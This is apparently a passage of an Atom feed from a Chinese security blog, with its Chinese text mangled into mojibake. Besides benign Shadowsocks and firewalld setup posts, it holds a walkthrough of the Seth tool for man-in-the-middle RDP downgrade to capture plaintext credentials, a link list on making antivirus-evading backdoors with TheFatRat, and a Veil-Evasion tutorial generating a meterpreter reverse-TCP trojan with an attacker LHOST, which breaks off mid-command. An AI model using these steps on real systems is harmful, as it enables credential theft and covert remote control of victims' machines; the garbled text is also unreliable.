&lt;p&gt;å†…ç½‘æ¸—é€ä¸­è·å¾—ç®¡ç†å‘˜ç”¨æˆ·åå¯†ç ä¹‹åï¼Œé€šè¿‡SMBç«¯å£445æ¥ä¸ç›®æ ‡æœºå™¨çš„è®¾å¤‡å»ºç«‹è¿æ¥çš„åæ¸—é€æŠ€å·§ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="MSF" scheme="https://yaalonsong.github.io/categories/msf/"/>
    
    
      <category term="å†…ç½‘" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="msf" scheme="https://yaalonsong.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>CentOS 7 å®‰è£… Shadowscoks</title>
    <link href="https://yaalonsong.github.io/2018/07/31/CentOS-7-%E5%AE%89%E8%A3%85-shadowscoks.html"/>
    <id>https://yaalonsong.github.io/2018/07/31/CentOS-7-å®‰è£…-shadowscoks.html</id>
    <published>2018-07-31T14:54:56.882Z</published>
    <updated>2018-08-22T17:16:52.388Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>é¦–å…ˆå®‰è£… pip ï¼Œä½¿ç”¨ pip å®‰è£… Shadowsocks </p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum upgrade</span><br><span class="line">yum install python-pip</span><br><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure></li><li><p>æ–°å»º Shadowsocks çš„é…ç½®æ–‡ä»¶</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/shadowsocks.json</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¾‘ Shadowocks é…ç½®æ–‡ä»¶</p></li><li><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>:<span class="string">"0.0.0.0"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>:<span class="number">1111</span>,</span><br><span class="line">    <span class="attr">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>:<span class="number">1080</span>,</span><br><span class="line">    <span class="attr">"password"</span>:<span class="string">"yourpassword"</span>,</span><br><span class="line">    <span class="attr">"timeout"</span>:<span class="number">300</span>,</span><br><span class="line">    <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line">    <span class="attr">"fast_open"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®firewallï¼Œå…è®¸ Shadowsocks æœåŠ¡ç«¯å£è¢«å¤–ç½‘è®¿é—®</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä»¥ä¸‹å‘½ä»¤ä¼šæ°¸ä¹…ç”Ÿæ•ˆ</span><br><span class="line">firewall-<span class="built_in">cmd</span> --zone=public --add-port=<span class="number">1111</span>/tcp --permanent</span><br><span class="line">é‡æ–°è½½å…¥ firewall</span><br><span class="line">firewall-<span class="built_in">cmd</span> --reload</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨ ssserver æœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br><span class="line">ssserver -c /etc/shadowsocks.json -d restart</span><br><span class="line">ssserver -c /etc/shadowsocks.json -d stop</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;é¦–å…ˆå®‰è£… pip ï¼Œä½¿ç”¨ pip å®‰è£… Shadowsocks &lt;/p&gt;
    
    </summary>
    
      <category term="vpsï¼ŒSS" scheme="https://yaalonsong.github.io/categories/vps%EF%BC%8CSS/"/>
    
    
      <category term="CentOS" scheme="https://yaalonsong.github.io/tags/CentOS/"/>
    
      <category term="shadowscoks" scheme="https://yaalonsong.github.io/tags/shadowscoks/"/>
    
  </entry>
  
  <entry>
    <title>CentOS7 ä½¿ç”¨ Firewalld æ‰“å¼€å…³é—­é˜²ç«å¢™ä¸ç«¯å£</title>
    <link href="https://yaalonsong.github.io/2018/07/31/CentOS7_firewalld.html"/>
    <id>https://yaalonsong.github.io/2018/07/31/CentOS7_firewalld.html</id>
    <published>2018-07-31T14:23:46.002Z</published>
    <updated>2018-08-22T17:16:45.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="firewalldçš„åŸºæœ¬ä½¿ç”¨"><a href="#firewalldçš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="firewalldçš„åŸºæœ¬ä½¿ç”¨"></a>firewalldçš„åŸºæœ¬ä½¿ç”¨</h2><a id="more"></a><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å¯åŠ¨ï¼š systemctl <span class="built_in">start</span> firewalld ï¼ˆservice firewalld <span class="built_in">start</span>ï¼‰</span><br><span class="line">å…³é—­ï¼š systemctl stop firewalld  ï¼ˆservice firewalld stopï¼‰</span><br><span class="line">æŸ¥çœ‹çŠ¶æ€ï¼š systemctl status firewalld </span><br><span class="line">å¼€æœºç¦ç”¨  ï¼š systemctl disable firewalld</span><br><span class="line">å¼€æœºå¯ç”¨  ï¼š systemctl enable firewalld</span><br></pre></td></tr></table></figure><h2 id="systemctlæ˜¯CentOS7çš„æœåŠ¡ç®¡ç†å·¥å…·ä¸­ä¸»è¦çš„å·¥å…·ï¼Œå®ƒèåˆä¹‹å‰serviceå’Œchkconfigçš„åŠŸèƒ½äºä¸€ä½“ã€‚"><a href="#systemctlæ˜¯CentOS7çš„æœåŠ¡ç®¡ç†å·¥å…·ä¸­ä¸»è¦çš„å·¥å…·ï¼Œå®ƒèåˆä¹‹å‰serviceå’Œchkconfigçš„åŠŸèƒ½äºä¸€ä½“ã€‚" class="headerlink" title="systemctlæ˜¯CentOS7çš„æœåŠ¡ç®¡ç†å·¥å…·ä¸­ä¸»è¦çš„å·¥å…·ï¼Œå®ƒèåˆä¹‹å‰serviceå’Œchkconfigçš„åŠŸèƒ½äºä¸€ä½“ã€‚"></a>systemctlæ˜¯CentOS7çš„æœåŠ¡ç®¡ç†å·¥å…·ä¸­ä¸»è¦çš„å·¥å…·ï¼Œå®ƒèåˆä¹‹å‰serviceå’Œchkconfigçš„åŠŸèƒ½äºä¸€ä½“ã€‚</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å¯åŠ¨ä¸€ä¸ªæœåŠ¡ï¼šsystemctl <span class="built_in">start</span> firewalld.service</span><br><span class="line">å…³é—­ä¸€ä¸ªæœåŠ¡ï¼šsystemctl stop firewalld.service</span><br><span class="line">é‡å¯ä¸€ä¸ªæœåŠ¡ï¼šsystemctl restart firewalld.service</span><br><span class="line">æ˜¾ç¤ºä¸€ä¸ªæœåŠ¡çš„çŠ¶æ€ï¼šsystemctl status firewalld.service</span><br><span class="line">åœ¨å¼€æœºæ—¶å¯ç”¨ä¸€ä¸ªæœåŠ¡ï¼šsystemctl enable firewalld.service</span><br><span class="line">åœ¨å¼€æœºæ—¶ç¦ç”¨ä¸€ä¸ªæœåŠ¡ï¼šsystemctl disable firewalld.service</span><br><span class="line">æŸ¥çœ‹æœåŠ¡æ˜¯å¦å¼€æœºå¯åŠ¨ï¼šsystemctl is-enabled firewalld.service</span><br><span class="line">æŸ¥çœ‹å·²å¯åŠ¨çš„æœåŠ¡åˆ—è¡¨ï¼šsystemctl list-unit-files|grep enabled</span><br><span class="line">æŸ¥çœ‹å¯åŠ¨å¤±è´¥çš„æœåŠ¡åˆ—è¡¨ï¼šsystemctl --failed</span><br></pre></td></tr></table></figure><h2 id="é…ç½®firewalld-cmd"><a href="#é…ç½®firewalld-cmd" class="headerlink" title="é…ç½®firewalld-cmd"></a>é…ç½®firewalld-cmd</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹ç‰ˆæœ¬ï¼š firewall-<span class="built_in">cmd</span> --version</span><br><span class="line">æŸ¥çœ‹å¸®åŠ©ï¼š firewall-<span class="built_in">cmd</span> --<span class="built_in">help</span></span><br><span class="line">æ˜¾ç¤ºçŠ¶æ€ï¼š firewall-<span class="built_in">cmd</span> --state</span><br><span class="line">æŸ¥çœ‹æ‰€æœ‰æ‰“å¼€çš„ç«¯å£ï¼š firewall-<span class="built_in">cmd</span> --zone=public --list-ports</span><br><span class="line">æ›´æ–°é˜²ç«å¢™è§„åˆ™ï¼š firewall-<span class="built_in">cmd</span> --reload</span><br><span class="line">æŸ¥çœ‹åŒºåŸŸä¿¡æ¯:  firewall-<span class="built_in">cmd</span> --get-active-zones</span><br><span class="line">æŸ¥çœ‹æŒ‡å®šæ¥å£æ‰€å±åŒºåŸŸï¼š firewall-<span class="built_in">cmd</span> --get-zone-of-interface=eth0</span><br><span class="line">æ‹’ç»æ‰€æœ‰åŒ…ï¼šfirewall-<span class="built_in">cmd</span> --panic-on</span><br><span class="line">å–æ¶ˆæ‹’ç»çŠ¶æ€ï¼š firewall-<span class="built_in">cmd</span> --panic-off</span><br><span class="line">æŸ¥çœ‹æ˜¯å¦æ‹’ç»ï¼š firewall-<span class="built_in">cmd</span> --query-panic</span><br></pre></td></tr></table></figure><h2 id="å¯¹ä¸€ä¸ªç«¯å£çš„å¼€å¯-æŸ¥çœ‹-åˆ é™¤æ“ä½œ"><a href="#å¯¹ä¸€ä¸ªç«¯å£çš„å¼€å¯-æŸ¥çœ‹-åˆ é™¤æ“ä½œ" class="headerlink" title="å¯¹ä¸€ä¸ªç«¯å£çš„å¼€å¯/æŸ¥çœ‹/åˆ é™¤æ“ä½œ"></a>å¯¹ä¸€ä¸ªç«¯å£çš„å¼€å¯/æŸ¥çœ‹/åˆ é™¤æ“ä½œ</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æ·»åŠ :  firewall-<span class="built_in">cmd</span> --zone=public --add-port=<span class="number">444</span>/tcp --permanent    (--permanentæ°¸ä¹…ç”Ÿæ•ˆï¼Œæ²¡æœ‰æ­¤å‚æ•°é‡å¯åå¤±æ•ˆ)</span><br><span class="line">é‡æ–°è½½å…¥:  firewall-<span class="built_in">cmd</span> --reload</span><br><span class="line">æŸ¥çœ‹:  firewall-<span class="built_in">cmd</span> --zone=public --query-port=<span class="number">444</span>/tcp</span><br><span class="line">åˆ é™¤:  firewall-<span class="built_in">cmd</span> --zone=public --remove-port=<span class="number">444</span>/tcp --permanent</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;firewalldçš„åŸºæœ¬ä½¿ç”¨&quot;&gt;&lt;a href=&quot;#firewalldçš„åŸºæœ¬ä½¿ç”¨&quot; class=&quot;headerlink&quot; title=&quot;firewalldçš„åŸºæœ¬ä½¿ç”¨&quot;&gt;&lt;/a&gt;firewalldçš„åŸºæœ¬ä½¿ç”¨&lt;/h2&gt;
    
    </summary>
    
      <category term="Linuxå‘½ä»¤" scheme="https://yaalonsong.github.io/categories/Linux%E5%91%BD%E4%BB%A4/"/>
    
    
      <category term="CentOS" scheme="https://yaalonsong.github.io/tags/CentOS/"/>
    
      <category term="firewall" scheme="https://yaalonsong.github.io/tags/firewall/"/>
    
  </entry>
  
  <entry>
    <title>é€šè¿‡é™çº§è¿æ¥åŠ«æŒRDPæ˜æ–‡å‡­æ®</title>
    <link href="https://yaalonsong.github.io/2018/05/03/seth.html"/>
    <id>https://yaalonsong.github.io/2018/05/03/seth.html</id>
    <published>2018-05-03T11:58:46.000Z</published>
    <updated>2018-08-22T17:17:44.928Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Sethæ˜¯ä¸€ç§ç”¨Pythonå’ŒBashç¼–å†™çš„å·¥å…·ï¼Œç”¨äºé€šè¿‡å°è¯•é™çº§è¿æ¥ä»¥æå–æ˜æ–‡å‡­æ®æ¥è¿›è¡ŒMitM RDPè¿æ¥ã€‚å®ƒçš„å¼€å‘ç›®çš„æ˜¯ä¸ºäº†æé«˜è®¤è¯†ï¼Œå¹¶åœ¨ç¬”è¯•ï¼Œè®²ä¹ ç­æˆ–ä¼šè°ˆçš„èƒŒæ™¯ä¸‹æ•™è‚²æ­£ç¡®é…ç½®çš„RDPè¿æ¥çš„é‡è¦æ€§ã€‚ä½œè€…æ˜¯Adrian Vollmerï¼ˆSySS GmbHï¼‰ã€‚</p></blockquote><a id="more"></a><h2 id="ç”¨æ³•ï¼š"><a href="#ç”¨æ³•ï¼š" class="headerlink" title="ç”¨æ³•ï¼š"></a>ç”¨æ³•ï¼š</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./seth.sh &lt;INTERFACE&gt; &lt;ATTACKER IP&gt; &lt;VICTIM IP&gt; &lt;GATEWAY IP|HOST IP&gt; [&lt;COMMAND&gt;]</span><br><span class="line">å®ä¾‹ï¼š</span><br><span class="line">./seth.sh ç½‘å£ æ”»å‡»è€…IP è®¿é—®RDP IP è¢«æ”»å‡»è€…IP &lt;å‘½ä»¤æ‰§è¡Œä¸€èˆ¬ä¸ç”¨&gt;</span><br><span class="line">./seth.sh eth0 192.168.3.149 192.168.3.150 192.168.3.138</span><br><span class="line">ä¸ä¸Šé¢å‘½ä»¤ç­‰ä»·ï¼ˆå¦‚æœæ‰€æœ‰æœºå™¨åœ¨åŒä¸€ç½‘æ®µå¯ç”¨ï¼‰ï¼š</span><br><span class="line">./seth.sh eth0 192.168.3.&#123;149,150,138&#125;</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•ï¼š"><a href="#æµ‹è¯•ï¼š" class="headerlink" title="æµ‹è¯•ï¼š"></a>æµ‹è¯•ï¼š</h2><ul><li>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/SySS-Research/Seth" target="_blank" rel="noopener">Seth</a></li></ul><ul><li>æ”»å‡»è€…æœºå™¨ï¼škali 192.168.3.149</li><li>è®¿é—®RDPæœºå™¨ï¼šwin 7 x64 192.168.3.150</li><li>è¢«æ”»å‡»è€…æœºå™¨ï¼šwin 10 x64 192.168.3.138</li></ul><blockquote><ol><li>æ¬ºéª—ARPå›å¤</li><li>å¯ç”¨IPv4æµé‡è½¬å‘ï¼Œå°†æµé‡ä»å—å®³ä¸»æœºé‡å®šå‘åˆ°æ”»å‡»è€…æœºå™¨ï¼Œç„¶åå†è½¬å‘åˆ°ç›®æ ‡RDPæœåŠ¡å™¨ã€‚</li><li>é…ç½®ä¸€ä¸ªiptableè§„åˆ™æ‹’ç»SYNæ•°æ®åŒ…ï¼Œä»¥é˜²æ­¢ç›´æ¥çš„RDPè®¤è¯ã€‚</li><li>æ•è·ç›®æ ‡ä¸»æœºçš„SYNæ•°æ®åŒ…ã€‚</li><li>å…‹éš†SSLè¯ä¹¦ã€‚<br>é‡æ–°é…ç½®iptablesè§„åˆ™ï¼Œä»¥å°†æµé‡ä»å—å®³å·¥ä½œç«™è·¯ç”±åˆ°ç›®æ ‡RDPä¸»æœºã€‚</li><li>é˜»æ­¢åˆ°ç«¯å£88çš„æµé‡ï¼Œä»¥å°†Kerberosèº«ä»½éªŒè¯é™çº§åˆ°NTLMã€‚</li></ol></blockquote><ul><li>seth æ‰§è¡Œå®Œçš„ç•Œé¢ï¼š</li></ul><p><img src="/uploads/start.jpg" alt=""></p><ul><li>è®¿é—®RDPçš„æœºå™¨å¼¹å‡ºï¼Œå°è¯•é€šè¿‡RDPå‘ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯çš„ç”¨æˆ·å°†ä¼šæ”¶åˆ°ä»¥ä¸‹æ¶ˆæ¯ï¼š</li></ul><p><img src="/uploads/ssl.jpg" alt=""></p><ul><li>æˆåŠŸè·å–è¢«æ”»å‡»è€…RDPçš„ç”¨æˆ·åå¯†ç ï¼š</li></ul><p><img src="/uploads/mm.jpg" alt=""></p><ul><li><p>å½“ä»¥ä¸‹å¤é€‰æ¡†æœªé€‰ä¸­æ—¶è¢«æ”»å‡»è€…å¯ä»¥ç›´æ¥ç™»å½•ç³»ç»Ÿï¼Œå¹¶ä¸”sethå¯ä»¥è¿›è¡Œé”®ç›˜è®°å½•ã€‚</p><p><img src="/uploads/ms.jpg" alt=""></p></li></ul><h2 id="å¤‡æ³¨ï¼š"><a href="#å¤‡æ³¨ï¼š" class="headerlink" title="å¤‡æ³¨ï¼š"></a>å¤‡æ³¨ï¼š</h2><ul><li>å½“æˆ‘ä½¿ç”¨win 10 åšä¸ºè®¿é—®æ”»å‡»ç›®æ ‡RDPçš„æœºå™¨æ—¶ï¼Œwin 10 ç›´æ¥æŠ¥é”™ ï¼Œæ”»å‡»æœºå™¨æ˜¾ç¤ºç±»ä¼¼â€œè¯·ç¡®è®¤åŠ å¯†æ–¹å¼æ˜¯ä¸æ˜¯xxxâ€ï¼Œä¸èƒ½æŠ“åˆ°å¯†ç ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘ç¯å¢ƒçš„é—®é¢˜ï¼‰ã€‚</li><li>ä½¿ç”¨win 7 åšä¸ºè®¿é—®æ”»å‡»ç›®æ ‡RDPçš„æœºå™¨ï¼Œå¼¹å‡ºsslè®¤è¯é‚£ä¸ªï¼ŒæœªæŠ¥é”™ï¼Œåªæ˜¯è¿›ä¸å»mstscï¼Œé‡æ–°ç™»å½•å³å¯ï¼ˆæ”»å‡»æœºå·²ç»æ–­å¼€ç›‘å¬æ‰€ä»¥å¯ä»¥æ­£å¸¸ç™»å½•ï¼‰ã€‚</li><li>ä½¿ç”¨win 8 åšä¸ºè®¿é—®æ”»å‡»ç›®æ ‡RDPçš„æœºå™¨ï¼Œå¼¹å‡ºsslè®¤è¯é‚£ä¸ªï¼ŒæŠ¥é”™ï¼ˆä½†æ˜¯ä¸å½±å“ï¼Œç‚¹å‡»é‡æ–°ç™»å½•å³å¯ç™»å½•æˆåŠŸï¼‰ã€‚</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Sethæ˜¯ä¸€ç§ç”¨Pythonå’ŒBashç¼–å†™çš„å·¥å…·ï¼Œç”¨äºé€šè¿‡å°è¯•é™çº§è¿æ¥ä»¥æå–æ˜æ–‡å‡­æ®æ¥è¿›è¡ŒMitM RDPè¿æ¥ã€‚å®ƒçš„å¼€å‘ç›®çš„æ˜¯ä¸ºäº†æé«˜è®¤è¯†ï¼Œå¹¶åœ¨ç¬”è¯•ï¼Œè®²ä¹ ç­æˆ–ä¼šè°ˆçš„èƒŒæ™¯ä¸‹æ•™è‚²æ­£ç¡®é…ç½®çš„RDPè¿æ¥çš„é‡è¦æ€§ã€‚ä½œè€…æ˜¯Adrian Vollmerï¼ˆSySS GmbHï¼‰ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="å†…ç½‘æ¸—é€" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="RDPæ”»å‡»" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/RDP%E6%94%BB%E5%87%BB/"/>
    
    
      <category term="RDP" scheme="https://yaalonsong.github.io/tags/RDP/"/>
    
      <category term="å†…ç½‘æ¸—é€" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>TheFatRat YouTube è§†é¢‘</title>
    <link href="https://yaalonsong.github.io/2018/04/27/bypass-av.html"/>
    <id>https://yaalonsong.github.io/2018/04/27/bypass-av.html</id>
    <published>2018-04-26T16:05:58.000Z</published>
    <updated>2018-08-22T17:06:23.759Z</updated>
    
    <content type="html"><![CDATA[<p>TheFatRat<br><a id="more"></a></p><ul><li>Screetsec Channel : <a href="https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw" target="_blank" rel="noopener">https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw</a></li><li>Udate thefatrat v1.8 <a href="https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8" target="_blank" rel="noopener">https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>file Pumper in linux with fatrat <a href="https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8" target="_blank" rel="noopener">https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>Kali linux 2016.2 | Setup FatRat and Bypass Windows 10 :<a href="https://www.youtube.com/watch?v=mkfKSCxvPec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=mkfKSCxvPec</a></li><li>Embed Backdoor Apk Andoird : <a href="https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be</a></li><li>Create Backdoor Php and Reconnect With TheFatRat : <a href="https://www.youtube.com/watch?v=gfS55fjd8Fg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gfS55fjd8Fg</a></li><li>THEFATRAT:BACKDOOR CREATOR &amp; BYPASS ANTIVIRUS AND INSTALL. : <a href="https://www.youtube.com/watch?v=C4YHVKPw6Zo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=C4YHVKPw6Zo</a></li><li>Exploit Windows 7/8/10 using Thefatrat ( option 2 ) : <a href="https://www.youtube.com/watch?v=-WbKOxIl_f4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=-WbKOxIl_f4</a></li><li>How to hack android device with FatRat on kali linux 2 :<a href="https://www.youtube.com/watch?v=yUuwnu-NUXE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=yUuwnu-NUXE</a></li><li>Kali Linux Tools - TheFatRat Tool For Generate Backdoor with MsfVenom : <a href="https://www.youtube.com/watch?v=7PMfPbrM0o4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=7PMfPbrM0o4</a></li><li>FUD 100 % Backdoor With TheFatRat pt.1 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=8lJBwclFwJI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=8lJBwclFwJI</a></li><li>FUD 100 % Backdoor With TheFatRat pt.2 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s</a></li><li>FUD 100 % Backdoor With TheFatRat pt.3 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=wCzsD6vt9CQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wCzsD6vt9CQ</a></li><li>TheFatrat Backdoor Undetectable by Antivirus Kali linux part 3 :<a href="https://www.youtube.com/watch?v=wuOCDn0NvWc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wuOCDn0NvWc</a></li><li>1000 % FUD Backdoor with TheFatRat Tool : <a href="https://www.youtube.com/watch?v=vPXWv0jaBEQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=vPXWv0jaBEQ</a></li><li>How To Use TheFatRat To Create Backdoor In Kali Rolling [FUD 100%] : <a href="https://www.youtube.com/watch?v=26tSOuPcpZk" target="_blank" rel="noopener">https://www.youtube.com/watch?v=26tSOuPcpZk</a></li><li>Backdoor (Virus) 100% Indetectable | TheFatRat : <a href="https://www.youtube.com/watch?v=26tSOuPcpZk" target="_blank" rel="noopener">https://www.youtube.com/watch?v=26tSOuPcpZk</a></li><li>Backdooring Android with TheFatRat Tool- Kali Linux Tutorial :<a href="https://www.youtube.com/watch?v=1SQW9lujjT8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=1SQW9lujjT8</a></li><li>Hacking Windows using TheFatRat + Apache2 Server + Ettercap + Metasploit on Kali Linux 2016.2 <a href="https://www.youtube.com/watch?v=FlXMslSjnGw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=FlXMslSjnGw</a></li><li>TheFatRat 1.9.6 - Trodebi ( Embed Trojan into Debian Package ) <a href="https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8" target="_blank" rel="noopener">https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>ALL VIDEO IN HERE : <a href="https://www.youtube.com/results?search_query=thefatrat+backdoor" target="_blank" rel="noopener">https://www.youtube.com/results?search_query=thefatrat+backdoor</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TheFatRat&lt;br&gt;
    
    </summary>
    
      <category term="bypass-av" scheme="https://yaalonsong.github.io/categories/bypass-av/"/>
    
      <category term="å…æ€" scheme="https://yaalonsong.github.io/categories/bypass-av/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="å…æ€" scheme="https://yaalonsong.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="bypass-av" scheme="https://yaalonsong.github.io/tags/bypass-av/"/>
    
  </entry>
  
  <entry>
    <title>Veil-Evasion + pyJoiner æ†ç»‘ä¸¤ä¸ª EXE çš„å…æ€æœ¨é©¬</title>
    <link href="https://yaalonsong.github.io/2018/03/09/veil+pyJoiner.html"/>
    <id>https://yaalonsong.github.io/2018/03/09/veil+pyJoiner.html</id>
    <published>2018-03-09T15:29:20.000Z</published>
    <updated>2018-08-22T17:17:49.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æœ€è¿‘åœ¨å­¦ä¹  veil çš„ Veil-Evasion æ¨¡å—ï¼Œå‘ç°ä¸€æ¬¾èƒ½æ†ç»‘ä¸¤ä¸ª exe æ–‡ä»¶çš„ pyJoiner å·¥å…·ï¼Œä¾¿æ‹¿æ¥å­¦ä¹ å­¦ä¹ ã€‚</p><a id="more"></a><h2 id="0x01-åœ¨kali-linux-2018-1-å®‰è£…ä½¿ç”¨-veil-3-1-1-åˆ¶ä½œå›è¿æœ¨é©¬"><a href="#0x01-åœ¨kali-linux-2018-1-å®‰è£…ä½¿ç”¨-veil-3-1-1-åˆ¶ä½œå›è¿æœ¨é©¬" class="headerlink" title="0x01 åœ¨kali linux 2018.1 å®‰è£…ä½¿ç”¨ veil 3.1.1 åˆ¶ä½œå›è¿æœ¨é©¬"></a>0x01 åœ¨kali linux 2018.1 å®‰è£…ä½¿ç”¨ veil 3.1.1 åˆ¶ä½œå›è¿æœ¨é©¬</h2><ul><li><p>Veil-Evasion åˆ¶ä½œå›è¿æœ¨é©¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# veil</span><br><span class="line">use 1                        #é€‰æ‹©ä½¿ç”¨ Veil-Evasion æ¨¡å—</span><br><span class="line">Veil-Evasion Menu</span><br><span class="line">41 payloads loaded</span><br><span class="line">Available Commands:</span><br><span class="line">backGo to main Veil menu</span><br><span class="line">checkvtCheck virustotal against generated hashes</span><br><span class="line">cleanRemove generated artifacts</span><br><span class="line">exitExit Veil</span><br><span class="line">infoInformation on a specific payload</span><br><span class="line">listList available payloads</span><br><span class="line">useUse a specific payload</span><br><span class="line">Veil-Evasion command: use 11        #é€‰æ‹©payload</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.3.149</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 4444</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] generate</span><br></pre></td></tr></table></figure><p><img src="/uploads/9.jpg" alt="veil"></p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¼€å¯ç›‘å¬ï¼š</p><p><code>root@kali:~# 